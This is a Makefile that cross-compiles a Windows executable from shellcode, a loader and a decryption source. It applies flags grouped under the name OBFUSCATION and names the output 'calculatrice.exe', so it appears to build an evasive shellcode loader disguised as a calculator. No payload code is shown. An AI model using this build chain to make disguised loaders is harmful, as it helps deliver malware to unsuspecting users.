CC = x86_64-w64-mingw32-gcc
CFLAGS = -Itemp -Wall -Wextra -O2 -mwindows -ffunction-sections -fdata-sections
LIBS = -luser32 -lshell32 -ladvapi32 #-lkernel32
OBFUSCATION = -s -fvisibility=hidden -fno-inline -fno-ident -fmerge-all-constants
LDFLAGS = -Wl,--gc-sections

SHELLCODE=asm/shellcode.nasm
SRC = temp/loader.c temp/decrypt.c #temp/WinAPI.c
HEADERS = temp/config.h
EXE = bin/calculatrice.exe


.PHONY: all clean pre-build

all: pre-build $(EXE)

pre-build:
	@mkdir -p bin build temp
	@cp src/* temp/
	@cp asm/* temp/
	@python3 main.py

$(EXE): $(SRC) $(HEADERS)
	$(CC) $(CFLAGS) $(OBFUSCATION) $(LDFLAGS) $(LIBS) $(SRC) -o $@

clean:
	rm -rf bin build temp